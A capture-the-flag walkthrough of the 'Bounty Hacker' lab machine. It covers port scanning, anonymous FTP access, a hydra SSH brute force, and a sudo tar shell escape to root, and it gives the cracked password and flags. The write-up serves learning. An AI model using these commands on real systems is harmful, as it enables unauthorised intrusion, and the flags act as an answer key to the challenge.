# Task 1 - Living up to the title

### Find open ports on the machine

For this section we can run an nmap scan

sudo nmap -sV -sC -T5 -p- 10.10.33.13 -oN \~/Github/BountyHackerCTF/nmapscan.md

I also ran a gobuster scan to find any additional directories on the webserver.

gobuster dir -u http://10.10.33.13 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 60 -q

From our nmap scan we can see that 3 ports are open 21,22,80 for ftp,ssh, and http

### Who wrote the task list?

Since we have the ftp port open we can try to log in as the anonymous user and see if there is anything useful.

ftp anonymous@IP

we are able to connect and we find 2 files on the ftp server, locks.txt and task.txt

we can get these files on our local machine by using get locks.txt and get task.txt

usng cat task.txt we can see that *lin* wrote the list

### What service can you bruteforce with the text file found?

when using cat locks.txt we can see it is a list of passwords, we can use this to bruteforce ssh since that is one of the other ports that is open
Answer: SSH

### What is the users password?

we can try bruteforcing the ssh password for lin with the following command

hydra -t 16 -l lin -P /home/bryce/Github/BountyHackerCTF/locks.txt ssh://IP

then we get the password: RedDr4gonSynd1cat3

[[https://github.com/USERNAME/REPOSITORY/blob/main/img/octocat.png](https://github.com/bryceburrow/Capture-the-Flag-Walkthroughs/blob/0f1c5b6b7acaa20b51b9353831d812f3a2504a76/hydraresult.png|alt=hydraresults]]

### user.txt

After connecting to SSH with the credentials we had found

Username: lin
Password: RedDr4gonSynd1cat3

the user.txt file is present in the Desktop directory: THM{CR1M3_SyNd1C4T3}

### root.txt

Now that we are in the machine under the lin user we can run sudo -l to find what files we are able to run with sudo.

User lin may run the following commands on bountyhacker:
    (root) /bin/tar

we get the above result, going to GTFObins we can see there is a command using tar as sudo to gain privlieged escalation

sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

after running the above command we get the root shell

now we are able to navigate to the /root directory and there is a root.txt that has the following contents: THM{80UN7Y_h4cK3r}

We were able to log in to ftp using the anonymous user and use the information gained from that user to crack the password for user "lin". we then used the command sudo -l to see what files can be run as root for lin. We were able to run tar as root and used a command from GTFObins to gain a root shell.
